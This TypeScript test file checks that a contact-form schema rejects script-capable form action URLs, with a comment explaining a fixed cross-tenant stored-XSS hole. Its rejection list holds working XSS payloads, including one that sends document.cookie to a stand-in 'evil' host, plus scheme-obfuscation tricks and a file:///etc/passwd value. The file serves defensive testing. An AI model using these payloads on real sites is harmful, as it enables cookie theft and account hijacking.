import assert from "node:assert/strict";
import test from "node:test";

import { contactFormSchemaV1 } from "./schema";

/**
 * SECURITY — contact_form `action` is a URL sink on PUBLISHED public pages.
 *
 * `<form action>` navigates on submit exactly like `<a href>` navigates on
 * click, and React does NOT neutralize script-capable schemes at runtime. The
 * field used to be a bare `z.string().min(1).max(500)` with no scheme check,
 * and the deep render-time guard (`prefixPublicHrefsDeep`) only covered keys
 * named href/ctaHref/rsvpUrl/brandHref. So an operator-persisted
 * `javascript:fetch('https://evil/?c='+document.cookie)` executed for every
 * visitor who submitted the form. Published tenant sites share the
 * *.tulala.digital apex and cookies are parent-scoped, so the blast radius is
 * cross-tenant, not self-XSS.
 *
 * These tests pin the WRITE-TIME half of the fix (the zod refinement). The
 * render-time half lives in src/lib/saas/public-hrefs.test.ts.
 */

function parseAction(action: string) {
  return contactFormSchemaV1.safeParse({
    fields: [{ name: "email", label: "Email", type: "email" }],
    action,
  });
}

test("contact_form schema rejects script-capable form actions at write time", () => {
  const dangerous = [
    "javascript:alert(1)",
    "javascript:fetch('https://evil/?c='+document.cookie)",
    "JavaScript:alert(1)",
    "  javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "vbscript:msgbox(1)",
    // Browser-normalized obfuscation: tab/newline/CR inside the scheme and
    // leading C0 controls are stripped before the browser parses the scheme,
    // so these all execute unless the guard normalizes the same way.
    "java\tscript:alert(1)",
    "java\nscript:alert(1)",
    "java\rscript:alert(1)",
    String.fromCharCode(1, 2) + "javascript:alert(1)",
    // Allowlist, not denylist.
    "blob:https://x/abc",
    "file:///etc/passwd",
  ];

  for (const action of dangerous) {
    const result = parseAction(action);
    assert.equal(result.success, false, `expected rejection for ${JSON.stringify(action)}`);
  }
});

test("contact_form schema still accepts legitimate form actions", () => {
  const safe = [
    "https://formspree.io/f/abc123",
    "http://example.com/submit",
    "/api/contact",
    "./submit",
    "mailto:hello@example.com",
    // The internal routing sentinel must keep validating, or every
    // internally-routed form fails to save.
    "internal",
    "internal:auto",
    "internal:inquiry",
  ];

  for (const action of safe) {
    const result = parseAction(action);
    assert.equal(result.success, true, `expected acceptance for ${JSON.stringify(action)}`);
  }
});

test("contact_form schema keeps its existing length bounds on action", () => {
  assert.equal(parseAction("").success, false);
  assert.equal(parseAction(`https://x.com/${"a".repeat(500)}`).success, false);
});
